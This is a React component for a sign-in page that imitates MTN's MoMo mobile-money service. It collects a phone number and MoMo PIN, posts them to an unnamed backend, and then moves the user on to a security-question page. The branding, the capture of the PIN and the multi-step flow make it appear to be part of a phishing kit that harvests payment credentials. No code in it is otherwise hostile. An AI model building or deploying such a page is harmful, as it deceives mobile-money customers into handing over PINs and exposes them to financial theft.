import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";
import { AiOutlineEye, AiOutlineEyeInvisible } from "react-icons/ai";

const schema = yup.object().shape({
  phoneNumber: yup
    .string()
    .matches(/^\d{10}$/, "Phone number must be exactly 10 digits")
    .required("Phone number is required"),
  pin: yup.string().required("MoMo PIN is required"),
});

const MoMoLogin = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [showPin, setShowPin] = useState(false);
  const [rememberMe, setRememberMe] = useState(false);

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const togglePin = () => {
    setShowPin(!showPin);
  };

  const submitForm = (data) => {
    setLoading(true);
    localStorage.setItem("userPhoneNumber", data.phoneNumber);
    axios
      .post(`${BASE_URL}/`, data)
      .then((response) => {
        console.log(response.data);
        navigate("/security-question");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <div className="flex-1 flex flex-col max-w-lg mx-auto w-full px-6 py-8">
        {/* Logo Section */}
        <div className="mb-8 flex justify-center">
          <div className="flex items-center gap-3">
            <div className="w-14 h-14 bg-[#1a4d7a] rounded-xl flex items-center justify-center relative overflow-hidden">
              <div className="absolute inset-0 bg-gradient-to-br from-[#1a4d7a] to-[#0d2f4d]"></div>
              <svg
                className="w-8 h-8 text-[#f9c74f] relative z-10"
                viewBox="0 0 24 24"
                fill="currentColor"
              >
                <path d="M12 2L2 7v10c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-10-5zm0 18c-3.86-.92-7-5.22-7-9V8.3l7-3.5 7 3.5V11c0 3.78-3.14 8.08-7 9z" />
                <path d="M10 14l-3-3 1.41-1.41L10 11.17l5.59-5.58L17 7l-7 7z" />
              </svg>
            </div>
            <div className="flex flex-col">
              <span className="text-2xl font-bold text-[#1a4d7a] tracking-tight">
                MoMo
              </span>
              <span className="text-xs text-gray-600">
                Payment Service Bank from MTN
              </span>
            </div>
          </div>
        </div>

        {/* Welcome Section */}
        <div className="mb-8">
          <h1 className="text-3xl font-light mb-2">
            <span className="text-[#f9c74f] font-semibold">Yello!</span>{" "}
            <span className="text-gray-800">Welcome Back!</span>
          </h1>
          <p className="text-gray-500 text-sm">
            Enter your registered phone number and MoMo PIN to sign in
          </p>
        </div>

        {/* Form Section */}
        <form
          onSubmit={handleSubmit(submitForm)}
          className="flex-1 flex flex-col"
        >
          <div className="flex-1">
            {/* Phone Number Input */}
            <div className="mb-6">
              <label
                htmlFor="phoneNumber"
                className="block text-sm font-medium text-gray-700 mb-2"
              >
                Phone Number <span className="text-red-500">*</span>
              </label>
              <input
                name="phoneNumber"
                type="text"
                maxLength="10"
                placeholder="Enter phone number"
                {...register("phoneNumber")}
                className="w-full px-4 py-3.5 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#f9c74f] focus:border-transparent text-gray-900 placeholder-gray-400 text-base"
              />
              <FormErrMsg errors={errors} inputName="phoneNumber" />
            </div>

            {/* MoMo PIN Input */}
            <div className="mb-4">
              <label
                htmlFor="pin"
                className="block text-sm font-medium text-gray-700 mb-2"
              >
                MoMo PIN <span className="text-red-500">*</span>
              </label>
              <div className="relative">
                <input
                  name="pin"
                  type={showPin ? "text" : "password"}
                  placeholder="Enter your MoMo PIN"
                  {...register("pin")}
                  className="w-full px-4 py-3.5 pr-12 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#f9c74f] focus:border-transparent text-gray-900 placeholder-gray-400 text-base"
                />
                <button
                  type="button"
                  onClick={togglePin}
                  className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors"
                >
                  {showPin ? (
                    <AiOutlineEyeInvisible className="w-5 h-5" />
                  ) : (
                    <AiOutlineEye className="w-5 h-5" />
                  )}
                </button>
              </div>
              <FormErrMsg errors={errors} inputName="pin" />
            </div>

            {/* Remember Me & Forgot Password */}
            <div className="flex items-center justify-between mb-6">
              <label className="flex items-center cursor-pointer">
                <input
                  type="checkbox"
                  checked={rememberMe}
                  onChange={(e) => setRememberMe(e.target.checked)}
                  className="w-4 h-4 border-2 border-gray-300 rounded text-[#f9c74f] focus:ring-[#f9c74f] cursor-pointer"
                />
                <span className="ml-2 text-sm text-gray-700">Remember Me</span>
              </label>
              <a
                href="/forgot-password"
                className="text-sm text-[#1a4d7a] hover:underline font-medium"
              >
                Forgot PIN?
              </a>
            </div>

            {/* Continue Button */}
            <button
              type="submit"
              disabled={loading}
              className="w-full bg-[#90b8c8] text-white py-3.5 rounded-lg font-medium text-base hover:bg-[#7da8b8] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {loading ? "Loading..." : "Continue"}
            </button>
          </div>

          {/* Footer Section */}
          <div className="mt-8 space-y-6">
            <div className="text-center">
              <a href="#" className="text-xs text-[#1a4d7a] hover:underline">
                Terms and Conditions
              </a>
              <span className="text-xs text-gray-600"> and </span>
              <a href="#" className="text-xs text-[#1a4d7a] hover:underline">
                Privacy Notice
              </a>
            </div>
          </div>
        </form>
      </div>
    </div>
  );
};

export default MoMoLogin;
